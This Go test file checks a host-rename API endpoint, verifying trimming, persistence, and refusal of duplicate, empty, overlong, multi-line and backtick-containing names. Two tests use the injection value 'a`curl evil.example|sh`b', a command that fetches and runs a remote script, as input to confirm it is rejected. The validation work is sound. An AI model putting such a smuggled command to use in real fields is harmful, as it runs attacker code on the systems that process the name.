package api

import (
	"net/http"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/naming"
	"github.com/eyupio/zoomies/internal/store"
)

// The name a host joined under comes from the agent's configuration, or from a
// container ID, and the operator is the one who has to read it every day.
func TestAnOperatorCanRenameAHost(t *testing.T) {
	h := newHarness(t)
	host := h.host("7096d9a9b798")
	operator, _ := h.user("operator", store.RoleOperator)

	res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"name": "  build-box  "}})
	res.mustStatus(t, http.StatusOK, "rename the host")

	var view hostResponse
	res.into(t, &view)
	if view.Name != "build-box" {
		t.Fatalf("name = %q, want the trimmed one", view.Name)
	}
	stored, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if stored.Name != "build-box" {
		t.Fatalf("stored name = %q; the rename lived in the response alone", stored.Name)
	}

	// A request that names something else leaves the name where it was.
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"capacity": 3}}).
		mustStatus(t, http.StatusOK, "change the capacity")
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "build-box" {
		t.Fatalf("changing the capacity cleared the name: %q", stored.Name)
	}
}

// Two hosts called the same thing could not be told apart in a pool's reasons,
// and an agent joining by name would find the wrong row.
func TestAHostCannotBeRenamedToAnotherHostsName(t *testing.T) {
	h := newHarness(t)
	h.host("taken")
	host := h.host("vm-2")
	operator, _ := h.user("operator", store.RoleOperator)

	for name, body := range map[string]string{
		"taken":      "taken",
		"empty":      "   ",
		"too long":   strings.Repeat("a", naming.MaxHostNameLength+1),
		"line break": "two\nlines",
		"backticks":  "a`curl evil.example|sh`b",
	} {
		res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
			cookie: h.session(operator), body: map[string]any{"name": body}})
		res.mustStatus(t, http.StatusUnprocessableEntity, "rename to "+name)
	}
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "vm-2" {
		t.Fatalf("name = %q after refused renames, want it unchanged", stored.Name)
	}

	// Saving the name it already has is not a clash with itself.
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"name": "vm-2"}}).
		mustStatus(t, http.StatusOK, "keep the same name")
}

// An agent chooses its name at join, and an operator may change it afterwards;
// the two doors share one rule, so a name the join refuses cannot be put on a
// host by renaming it. The refusal says what is wrong without repeating the
// name, because it is the text nobody has vouched for.
func TestARenameThatCouldPassForACommandIsRefusedAndSaysWhy(t *testing.T) {
	h := newHarness(t)
	host := h.host("vm-2")
	operator, _ := h.user("operator", store.RoleOperator)

	res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"name": "a`curl evil.example|sh`b"}})
	res.mustStatus(t, http.StatusUnprocessableEntity, "rename to a name with backticks")
	if body := string(res.body); !strings.Contains(body, "backtick") || strings.Contains(body, "evil.example") {
		t.Errorf("the refusal should name the rule and not repeat the name: %s", body)
	}
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "vm-2" {
		t.Fatalf("name = %q after a refused rename, want it unchanged", stored.Name)
	}

	// A host already stored under such a name can be given a good one: the
	// rule is about the name being set, not the one being replaced.
	legacy := h.host("old`name")
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + legacy.ID,
		cookie: h.session(operator), body: map[string]any{"name": "tidy-name"}}).
		mustStatus(t, http.StatusOK, "rename a host out of a name that is now refused")
}
